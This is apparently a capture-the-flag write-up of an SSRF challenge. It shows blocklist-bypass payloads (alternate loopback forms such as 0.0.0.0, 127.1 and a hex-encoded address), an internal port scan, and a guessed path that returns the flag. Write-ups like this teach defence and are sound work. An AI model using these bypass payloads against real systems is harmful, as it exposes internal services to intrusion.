# SAFCTF — Inside Job (SSRF) — "Orbit Dispatch"

- **Category:** Web
- **Vulnerability:** Server-Side Request Forgery (SSRF) with blocklist bypass

## The setup

A "URL to fetch" field let the server make an HTTP request on the user's behalf
and return the response (headers, status, body preview).

## Commands run

**1. Baseline + blocked internal targets:**

```
https://example.com
http://127.0.0.1/
http://localhost/
http://127.0.0.1:80/
```

→ `{"error": "url blocked by policy"}` for the internal addresses, confirming a
string-based blocklist.

**2. Blocklist bypass attempts (alternate loopback representations):**

```
http://0.0.0.0/
http://127.1/
http://0x7f.0x0.0x0.0x1/
http://127.0.0.1.nip.io/   (blocked — filter also resolves/checks DNS-based tricks)
```

→ `0.0.0.0`, `127.1`, and `0x7f.0x0.0x0.0x1` all got through, reaching a real
(failed) connection attempt:

```json
{"error": "fetch error: HTTPConnectionPool(host='0.0.0.0', port=80): Max retries exceeded ... Connection refused"}
```

**3. Internal port scan using the `0.0.0.0` bypass:**

```
http://0.0.0.0:5000/
http://0.0.0.0:8000/
http://0.0.0.0:9000/
```

- Port 8000 → Flask/Werkzeug app (full HTML homepage returned)
- Port 9000 → bare Python `BaseHTTPServer`, returned
  `{"status_code": 404, "preview": "Not found"}` on `/` — confirmed it had real
  routes defined

**4. Path guessing on the live internal service:**

```
http://0.0.0.0:9000/flag
```

→ Returned the flag directly in the response preview.

## Flag

```
safctf{9f3a458f3a26e6372b5b5467e3e51edf}
```

## Root cause

Blocklist-based SSRF protection checked for specific hostname strings but didn't
account for all equivalent ways to write a loopback address, allowing internal
port scanning and access to an unauthenticated internal service.
